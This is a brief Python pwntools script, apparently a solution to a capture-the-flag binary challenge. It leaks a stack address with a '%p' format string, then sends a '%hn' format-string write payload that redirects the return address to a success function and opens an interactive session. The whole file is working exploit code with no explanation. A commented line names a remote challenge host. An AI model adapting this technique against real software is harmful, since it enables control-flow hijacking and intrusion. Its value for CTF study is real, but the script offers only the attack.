from pwn import *

# ip_port = "nc 61.147.171.105 61714".split(" ")
# p = remote(ip_port[-2], ip_port[-1])


ip_port = "localhost:60160".split(":")
io = remote(ip_port[-2], ip_port[-1])

suc_addr = 0x08049317

# ip_port = "192.168.170.128:1234".split(":")
# p = remote(ip_port[-2], ip_port[-1])


# context.log_level = "debug"
# payload = p32(suc_addr) + b'@@%15$s@@'
# print(len(payload))
io.sendline(b'3')
io.sendline(b"%p")
io.recvuntil('0x')
ret_addr = int(io.recvline().strip(), 16) + 0x1c + 4
print(hex(ret_addr))
# ret_addr = 0x70243745
io.sendline(b'3')
payload = p32(ret_addr)+b'%37655c%7$hn'
io.sendline(payload)
print(io.recvline())
sleep(1)
io.interactive()
